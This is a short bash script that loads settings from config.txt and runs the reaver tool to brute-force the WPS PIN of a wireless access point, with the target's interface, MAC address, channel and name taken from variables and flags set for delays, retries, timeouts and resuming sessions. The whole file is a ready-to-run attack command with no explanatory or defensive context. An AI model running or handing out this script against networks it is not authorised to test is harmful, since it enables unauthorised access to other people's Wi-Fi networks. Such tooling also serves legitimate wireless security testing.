#!/bin/bash

source config.txt

reaver -i $interface -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A -s session_$ap_name.wpc
